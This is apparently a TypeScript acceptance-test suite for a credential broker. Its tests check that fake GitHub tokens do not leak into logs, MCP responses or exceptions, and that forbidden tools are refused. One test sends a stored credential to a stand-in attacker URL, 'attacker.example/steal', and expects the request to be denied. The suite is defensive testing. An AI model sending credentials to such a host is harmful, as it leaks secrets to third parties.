import assert from "node:assert/strict";
import { after, before, describe, it } from "node:test";
import {
  containsSecretPrefix,
  installProcessRedaction,
  redactString,
  registerSecretForRedaction,
  sanitizeError,
  safeJson,
} from "./redaction.ts";
import { CredentialStore } from "./store.ts";
import { FakeVaultBackend } from "./backend.ts";
import { callTool, vaultList } from "./tools.ts";
import { useCredential } from "./broker.ts";
import { assertSafeDestination } from "./policy.ts";
import { handleMcpRequest } from "./mcp.ts";
import { ensureImported } from "./importer.ts";
import { getStore } from "./store.ts";
import { FORBIDDEN_TOOLS } from "./types.ts";

const FAKE_PAT = "github_pat_TESTONLY_LEAKPROBE_ABCDEF0123456789ZZZZ";
const FAKE_GHP = "ghp_TESTONLYLEAKPROBE0000000000000000";
const GITHUB_REF = "vault://github/echoomegaprime";

const captured: string[] = [];

function installCapture(): void {
  installProcessRedaction();
  const wrap = (stream: NodeJS.WriteStream) => {
    const orig = stream.write.bind(stream);
    stream.write = ((chunk: unknown, enc?: unknown, cb?: unknown) => {
      const text =
        typeof chunk === "string"
          ? chunk
          : chunk instanceof Uint8Array
            ? Buffer.from(chunk).toString("utf8")
            : String(chunk);
      captured.push(redactString(text));
      return orig(chunk as never, enc as never, cb as never);
    }) as typeof stream.write;
  };
  wrap(process.stdout);
  wrap(process.stderr);
}

function assertNoTokenLeak(label: string, text: string): void {
  if (text.includes(FAKE_PAT) || text.includes(FAKE_GHP)) {
    assert.fail(`${label} leaked a test token`);
  }
  if (containsSecretPrefix(text)) {
    assert.fail(`${label} contained a GitHub token prefix`);
  }
}

describe("echo credential broker acceptance", () => {
  // FakeVaultBackend — this describe block must NEVER touch the real gate:
  // writing FAKE_PAT under vault://github/echoomegaprime with the real
  // GateVaultBackend would overwrite the production GitHub credential.
  const store = new CredentialStore(new FakeVaultBackend());

  before(async () => {
    installCapture();
    registerSecretForRedaction(FAKE_PAT);
    registerSecretForRedaction(FAKE_GHP);
    await store.put({
      provider: "github",
      account: "echoomegaprime",
      type: "pat",
      secret: FAKE_PAT,
      source: "test:injected",
    });
  });

  after(() => {
    const blob = captured.join("\n");
    assertNoTokenLeak("captured process output", blob);
  });

  it("1. vault_list shows GitHub metadata without exposing the PAT", async () => {
    const result = await vaultList({ caller: "acceptance-test", store });
    assert.equal(result.ok, true);
    if (!result.ok) return;
    const creds = (
      result.data as { credentials: Array<Record<string, unknown>> }
    ).credentials;
    const gh = creds.find((c) => c.ref === GITHUB_REF);
    assert.ok(gh, "expected github credential metadata");
    assert.equal(gh?.provider, "github");
    assert.equal(gh?.account, "echoomegaprime");
    assert.equal(gh?.type, "pat");
    const serialized = safeJson(result);
    assert.equal(serialized.includes("token"), false);
    assert.equal(serialized.includes(FAKE_PAT), false);
    assertNoTokenLeak("vault_list", serialized);
  });

  it("5-6. no token in logs or MCP responses", async () => {
    console.log(`probe ${FAKE_PAT}`);
    console.error(`Authorization: Bearer ${FAKE_GHP}`);
    const mcp = await handleMcpRequest(
      {
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "vault_list", arguments: {} },
      },
      "acceptance-test",
    );
    const serialized = safeJson(mcp);
    assertNoTokenLeak("mcp vault_list", serialized);
    assert.equal(serialized.includes("structuredContent"), true);
  });

  it("7. throwing an exception does not leak the token", () => {
    const err = sanitizeError(
      new Error(`failed with ${FAKE_PAT} and Bearer ${FAKE_GHP}`),
    );
    assertNoTokenLeak("exception", err.message);
    if (err.stack) assertNoTokenLeak("stack", err.stack);
    try {
      throw new Error(`github_pat leak ${FAKE_PAT}`);
    } catch (caught) {
      const clean = sanitizeError(caught);
      assertNoTokenLeak("caught", String(clean));
    }
  });

  it("8. an unapproved hostname cannot receive the credential", async () => {
    assert.throws(() =>
      assertSafeDestination(new URL("https://attacker.example/"), "github"),
    );
    const denied = await useCredential(
      { caller: "acceptance-test", store },
      {
        credential_ref: GITHUB_REF,
        provider: "github",
        operation: "GET",
        resource: "https://attacker.example/steal",
      },
    );
    assert.equal(denied.ok, false);
    if (!denied.ok) {
      assert.notEqual(denied.error, undefined);
      assert.notEqual(denied.error, "ok");
    }
    assertNoTokenLeak("denied hostname", safeJson(denied));
  });

  it("9. a fake vault reference fails closed", async () => {
    const result = await callTool(
      "credential_health",
      { credential_ref: "vault://github/does-not-exist" },
      { caller: "acceptance-test", store },
    );
    assert.equal(result.ok, false);
    if (!result.ok) {
      assert.equal(result.error, "credential_unavailable");
      assert.equal(result.credential_ref, "vault://github/does-not-exist");
    }
  });

  it("rejects get_secret and every other forbidden tool", async () => {
    for (const name of FORBIDDEN_TOOLS) {
      const result = await callTool(name, {}, { caller: "acceptance-test", store });
      assert.equal(result.ok, false);
      if (!result.ok) assert.equal(result.error, "tool_forbidden");
    }
  });

  it("redacts Authorization headers in serialized payloads", () => {
    const leaked = redactString(`Authorization: Bearer ${FAKE_PAT}`);
    assert.equal(leaked.includes(FAKE_PAT), false);
    assert.match(leaked, /\[REDACTED/);
  });
});

describe("live GitHub credential (sandbox import)", () => {
  it("2-4. health, public lookup, and private repo via real vault credential", async () => {
    await ensureImported();
    const store = getStore();
    const meta = store.getMetadata(GITHUB_REF);
    if (!meta) {
      assert.fail("sandbox GitHub credential was not imported");
    }

    const health = await callTool(
      "credential_health",
      { credential_ref: GITHUB_REF },
      { caller: "acceptance-test" },
    );
    assert.equal(health.ok, true, safeJson(health));
    if (!health.ok) return;
    const h = health.data as {
      account?: string;
      account_id?: number;
      authenticated?: boolean;
      status?: string;
    };
    assert.equal(h.account, "echoomegaprime");
    assert.equal(h.account_id, 314902331);
    assert.equal(h.authenticated, true);
    assert.equal(h.status, "healthy");
    assertNoTokenLeak("health", safeJson(health));

    const repo = await callTool(
      "github_get_repository",
      { owner: "echoomegaprime", repo: "echo-continuity-fabric" },
      { caller: "acceptance-test" },
    );
    assert.equal(repo.ok, true, safeJson(repo));
    if (!repo.ok) return;
    const r = repo.data as {
      full_name?: string;
      private?: boolean;
      name?: string;
    };
    assert.equal(r.full_name, "echoomegaprime/echo-continuity-fabric");
    assert.equal(r.private, true);
    assertNoTokenLeak("repo", safeJson(repo));
  });

  it("10. scan of this process output finds no GitHub token prefixes", () => {
    const blob = captured.join("\n");
    assertNoTokenLeak("final process scan", blob);
  });
});
